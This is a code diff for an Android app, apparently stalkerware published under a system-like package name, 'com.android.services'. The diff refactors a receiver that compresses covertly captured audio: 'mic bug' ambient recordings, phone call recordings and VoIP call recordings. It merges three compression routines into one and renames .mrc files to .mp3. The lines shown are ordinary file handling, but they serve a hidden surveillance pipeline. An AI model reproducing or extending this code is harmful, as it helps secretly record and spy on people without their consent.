@@ -5,14 +5,11 @@ import android.content.Context
 import android.content.Intent
 import com.android.services.db.entities.CallRecording
 import com.android.services.db.entities.MicBug
-import com.android.services.db.entities.ScreenRecording
 import com.android.services.db.entities.VoipCall
-import com.android.services.models.VoipCallRecord
 import com.android.services.util.AppConstants
 import com.android.services.util.AppUtils
 import com.android.services.util.AudioCompressionUtil
 import com.android.services.util.InjectorUtils
-import com.android.services.util.VideoCompressionUtil
 import com.android.services.util.logException
 import com.android.services.util.logVerbose
 import kotlinx.coroutines.Dispatchers
@@ -20,6 +17,7 @@ import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.async
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.io.File
 
 class AudioFileCompressorReceiver : BroadcastReceiver() {
     companion object {
@@ -40,7 +38,13 @@ class AudioFileCompressorReceiver : BroadcastReceiver() {
                                 AppConstants.MIC_BUG_TYPE
                             )
                             for (micBug in micBugs) {
-                                val compressJob = async { compressFile(context,micBug) }
+                                val compressJob = async {
+                                    compressFile(
+                                        context,
+                                        micBug.file,
+                                        AppConstants.MIC_BUG_TYPE
+                                    )
+                                }
                                 compressJob.await()
                             }
                         }
@@ -50,7 +54,13 @@ class AudioFileCompressorReceiver : BroadcastReceiver() {
                                 AppConstants.CALL_RECORD_TYPE
                             )
                             for (callRecording in callRecordings) {
-                                val compressJob = async { compressFile(context,callRecording) }
+                                val compressJob = async {
+                                    compressFile(
+                                        context,
+                                        callRecording.file,
+                                        AppConstants.CALL_RECORD_TYPE
+                                    )
+                                }
                                 compressJob.await()
                             }
                         }
@@ -60,7 +70,13 @@ class AudioFileCompressorReceiver : BroadcastReceiver() {
                                 AppConstants.VOIP_CALL_TYPE
                             )
                             for (voipCallRecording in voipCallRecordings) {
-                                val compressJob = async { compressFile(context,voipCallRecording) }
+                                val compressJob = async {
+                                    compressFile(
+                                        context,
+                                        voipCallRecording.file,
+                                        AppConstants.VOIP_CALL_TYPE
+                                    )
+                                }
                                 compressJob.await()
                             }
                         }
@@ -76,30 +92,20 @@ class AudioFileCompressorReceiver : BroadcastReceiver() {
         }
     }
 
-    private fun compressFile(context: Context, micBug: MicBug) {
-        val destFile =
-            "${micBug.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
-                micBug.file.substringAfterLast("/")
+    private fun compressFile(context: Context, file: String, logType: String) {
+        var destFile =
+            "${file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
+                file.substringAfterLast("/")
             }"
-        AudioCompressionUtil.compressAudio(context, micBug.file, destFile)
+        destFile=destFile.replace(".mrc",".mp3")
+        AudioCompressionUtil.compressAudio(context,file, destFile, logType)
     }
 
-    private fun compressFile(context: Context, callRecording: CallRecording) {
-        val destFile =
-            "${callRecording.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
-                callRecording.file.substringAfterLast("/")
-            }"
-        AudioCompressionUtil.compressAudio(context, callRecording.file, destFile)
+    private fun reNameFile(file: String, newSourceFile: String) {
+        val inputFile=File(file)
+        val outputFile=File(newSourceFile)
+        inputFile.renameTo(outputFile)
     }
-    private fun compressFile(context: Context, voipCall: VoipCall) {
-        val destFile =
-            "${voipCall.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
-                voipCall.file.substringAfterLast("/")
-            }"
-        AudioCompressionUtil.compressAudio(context, voipCall.file, destFile)
-    }
-
-
     private suspend fun fetchMicBugs(context: Context): List<MicBug> {
         return withContext(Dispatchers.IO) {
             InjectorUtils.provideMicBugRepository(context)
